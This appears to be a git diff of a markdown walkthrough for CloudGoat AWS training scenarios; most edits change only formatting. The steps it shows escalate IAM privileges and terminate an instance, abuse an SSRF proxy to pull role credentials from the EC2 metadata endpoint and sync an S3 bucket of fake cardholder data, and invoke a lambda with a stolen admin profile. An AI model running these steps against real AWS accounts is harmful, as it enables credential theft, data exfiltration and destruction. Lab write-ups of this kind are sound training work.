@@ -155,12 +155,12 @@ Further inspection if the Group Names are to be believed, one is for http, and t
 `aws ec2 describe-instances --instance-id <newInstanceID> --profile kerrigan`
 16. SSH into the newly created instance    
 `ssh -i mighty.pem ubuntu@<publicDNSnameValue>`
-17. Install AWS CLI
+17. Install AWS CLI  
 `sudo apt-get update && apt install awscli`
-18. Look at the permissions of the mighty policy
-`aws iam get-policy-version --policy-arn <mightArn> --version-id v1`
-Now that the new instance contains full admin access the targe instance can be terminated from it
-19. `aws ec2 terminate-instances --instance-ids <targetInstanceID> --region us-east-1`   
+18. Look at the permissions of the mighty policy   
+`aws iam get-policy-version --policy-arn <mightArn> --version-id v1`   
+19. Now that the new instance contains full admin access the targe instance can be terminated from it   
+`aws ec2 terminate-instances --instance-ids <targetInstanceID> --region us-east-1`   
 **Goal Achieved**
 
 ### Remove iam_privesc_by_attachment
@@ -172,56 +172,56 @@ Now that the new instance contains full admin access the targe instance can be t
 6. Click **Yes, Terminate** when the warning that all data will be lost on the instance pops up
 7. Click Key Pairs on the left of the screen
 8. Ensure the checkbox for the mighty key pair is checked and click Delete
-9. Remove the scenario with cloudgoat
+9. Remove the scenario with cloudgoat    
 `cloudgoat.py destroy iam_privesc_by_attachment --profile goat`
 10. Remove the aws cli credentials for Kerrigan 
-11. Remove the mighty.pem file
+11. Remove the mighty.pem file   
 `rm  mighty.pem`
 
 ## cloud_breach_s3
-**Scenario Goal: Download the confidential files from the S3 bucket**
+**Scenario Goal: Download the Confidential Files from the S3 Bucket**
 1. Create scenario  
 `./cloudgoat.py create cloud_breach_s3 --profile goat`  
 2. Document the Output information, which only include an account id and an ec2 server address   
-3. Submit a curl request to the ec2 IP   
+3. Submit a curl request to the EC2 IP   
 `curl -sv http://<ec2IP>`
 This contains an H1 header stating the server is configured to proxy requests to the EC2 metadata service. It even contains instruction requred to successfully submit a request.  
 The IP 169.254.169.254 is a link-local address used for retrieving metadata. It is meant to be used from an instance to retrieve metadata for that instance. Let's use that as our modified header and see what happens.
-4. Submit a metadata curl request
-`curl -sv http://<ec2IP>/latest/meta-data/ -H 'Host:169.254.169.254`
+4. Submit a metadata curl request   
+`curl -sv http://<ec2IP>/latest/meta-data/ -H 'Host:169.254.169.254`   
 This requests reveals a directory structure, iam is an interesting place to start.
-5. Submit an iam metadata curl request
-`curl -sv http://<ec2IP>/latest/meta-data/iam/ -H 'Host:169.254.169.254`
+5. Submit an iam metadata curl request    
+`curl -sv http://<ec2IP>/latest/meta-data/iam/ -H 'Host:169.254.169.254`   
 This results one file called info and a directory called security-credentials
-6. Submit and iam info metadata curl request
+6. Submit and iam info metadata curl request    
 `curl -sv http://<ec2IP>/latest/meta-data/iam/info -H 'Host:169.254.169.254`
-7. Document the results for later and explore the security-credentials folder
+7. Document the results for later and explore the security-credentials folder   
 `curl -sv http://<ec2IP>/latest/meta-data/iam/security-credentials/ -H 'Host:169.254.169.254`
-8. Continue Enumeration with the WAF Role and copy the secrets it results in
+8. Continue Enumeration with the WAF Role and copy the secrets it results in   
 `curl -sv http://<ec2IP>/latest/meta-data/iam/security-credentials/cg-banking-WAF-Role-cgidx -H 'Host:169.254.169.254`
 9. Now that we have credentials we can create a role profile   
 `aws configure --profile Wrole`    
     * AWS Access Key ID: __WAF Role aws_access_key_id__   
     * AWS Secret Access Key: __WAF Role aws_secret_access_key__   
     * Default region name: __us-east-1__   
-    * Default output format: __leave blank__ 
-10. Edit the AWS Credentials file to add the session token  
+    * Default output format: __leave blank__  
+10. Edit the AWS Credentials file to add the session token   
 `vim ~/.aws/credentials`  
 `:set paste` Enter  
 `i` navigate to the end of the last line then add the session token  
 `aws_session_token = <token>`ESC  
 `:wq` Enter   
 Let's see what these credentials can do  
-11. Attempt to list s3 buckets
+11. Attempt to list s3 buckets   
 `aws s3 ls --profile wrole`  
-Success! 
+Success!  
 13. Copy the discovered bucket name into a local folder, we'll name it cardholder after the bucket name    
 `aws s3 cp s3://<bucket> ./cardholder --profile wrole`   
-That didn't work, maybe we can sync?  
+That didn't work, maybe we can sync?   
 14. Sync the bucket with a local folder   
 `aws s3 sync s3://<bucket> ./cardholder --profile wrole`  
 **Goal Achieved**
-15. Review the new folder for creepy fake PII information
+15. Review the new folder for creepy fake PII information     
 ```bash
 ls -la cardholder
 cat cardholder/cardholder_data_primary.csv
@@ -298,12 +298,12 @@ The cg profile doesn't appear to have permmissions for viewing lambda/ec2/iam re
     * Default region name: __us-east-1__   
     * Default output format: __leave blank__ 
 Try for the goal again, with the **admin** profile
-19. Attempt to list lambda functions
+19. Attempt to list lambda functions    
 `aws lambda list-functions --profile admin`   
 So far so good   
-20. Attempt to execute the lambda function
+20. Attempt to execute the lambda function    
 `aws lambda invoke --function-name <function-name> --profile admin outfile`
-21. Look for and read the outfile
+21. Look for and read the outfile    
 ```bash
 ls -la 
 cat outfile
@@ -311,7 +311,7 @@ cat outfile
 **Goal Achieved**
 
 ### Remove ec2_ssrf 
-1. Remove all of the files copied or created locally
+1. Remove all of the files copied or created locally    
 `rm outfile`   
 `rm admin-user.txt`
 2. Removed the scenario   
